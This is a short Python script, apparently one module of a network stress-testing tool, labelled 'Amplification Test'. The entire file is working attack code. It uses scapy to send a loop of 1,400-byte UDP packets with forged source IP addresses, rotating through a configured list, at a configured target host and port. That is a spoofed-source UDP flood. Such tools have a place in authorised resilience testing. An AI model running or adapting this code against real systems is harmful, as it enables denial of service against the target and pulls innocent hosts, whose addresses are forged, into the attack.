from config import (TARGET_IP, SRC_IP_LIST, DEFAULT_TARGET_PORT, DEFAULT_COUNT, DEFAULT_INTERVAL)
from scapy.layers.inet import IP, UDP
from scapy.packet import Raw
from scapy.sendrecv import send
from tqdm import tqdm
import time

NAME = "Amplification Test"

def run():

    payload = b"A" * 1400

    for i in tqdm(range(DEFAULT_COUNT), desc=NAME):

        src_ip = SRC_IP_LIST[i % len(SRC_IP_LIST)]

        packet = (IP(src=src_ip,dst=TARGET_IP)/UDP(dport=DEFAULT_TARGET_PORT)/Raw(payload))

        send(packet, verbose=False)

        time.sleep(DEFAULT_INTERVAL)


if __name__ == "__main__":
    run()